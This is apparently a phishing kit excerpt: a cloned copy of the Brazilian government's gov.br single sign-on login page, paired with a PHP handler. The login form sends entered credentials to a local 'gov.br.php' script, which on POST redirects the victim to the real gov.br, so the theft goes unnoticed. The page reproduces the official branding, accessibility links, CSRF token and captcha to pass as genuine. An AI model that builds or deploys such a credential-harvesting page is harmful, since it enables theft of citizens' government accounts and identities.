...
if ($_SERVER["REQUEST_METHOD"] == "POST"){
	...
	echo "<script>window.location.href='gov.br';</script>";
...
<!DOCTYPE html>
<!-- saved from url=(0081)https://sso.acesso.gov.br/login?client_id=www.gov.br&authorization_id=19c99f11fbd -->
...
function asmReferrerGetter() { return "https://www.gov.br/"; }
...
<body>
    <a tabindex="0" href="https://sso.acesso.gov.br/login?client_id=www.gov.br&amp;authorization_id=19c99f11fbd#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conte̼do principal. Navegue sempre com a tecla TAB">Pular para o conte̼do principal</a>

    <header>
        <a href="https://www.gov.br/"><img src="./gov.br - Acesse sua conta_files/govbr.png" alt="Logomarca GovBR"></a>
        <div id="acessibilidade">
            <span>
                <a href="https://sso.acesso.gov.br/login?client_id=www.gov.br&amp;authorization_id=19c99f11fbd#" onclick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
            </span>
            <span>
	...
	<form method="post" id="loginData" action="gov.br.php" autocomplete="off" novalidate="">
		<div class="card" id="login-cpf">
			...
			<div class="item-login-signup-ways" onclick="accordion(&#39;accordion-panel-id&#39;)">
				...
				<div class="item-login-signup-ways" onclick="showQrCode(&#39;9d7cfe88-ca3b-4a4a-b9e3-4733dd68a3d0&#39;);">
						<a tabindex="5" href="https://sso.acesso.gov.br/login?client_id=www.gov.br&amp;authorization_id=19c99f11fbd#">
						    <img src="./gov.br - Acesse sua conta_files/qrcode.png">
								Login com QR code
					   		</a>
					</div>
				<div class="item-login-signup-ways" id="cert-digital">
					<button id="login-certificate" type="submit" formaction="https://certificado.sso.acesso.gov.br/login?client_id=www.gov.br&amp;authorization_id=19c99f11fbd" name="operation" value="login-certificate" class="button-href-mimic2" tabindex="4">
        ...
        <input type="hidden" name="_csrf" value="9d7cfe88-ca3b-4a4a-b9e3-4733dd68a3d0">
		...
		<div id="hcaptcha"><iframe aria-hidden="true" data-hcaptcha-widget-id="006alsgluzdrm" data-hcaptcha-response="" src="./gov.br - Acesse sua conta_files/hcaptcha.html" style="display: none;"></iframe><textarea id="h-captcha-response-006alsgluzdrm" name="h-captcha-response" style="display: none;"></textarea></div>
			<script>
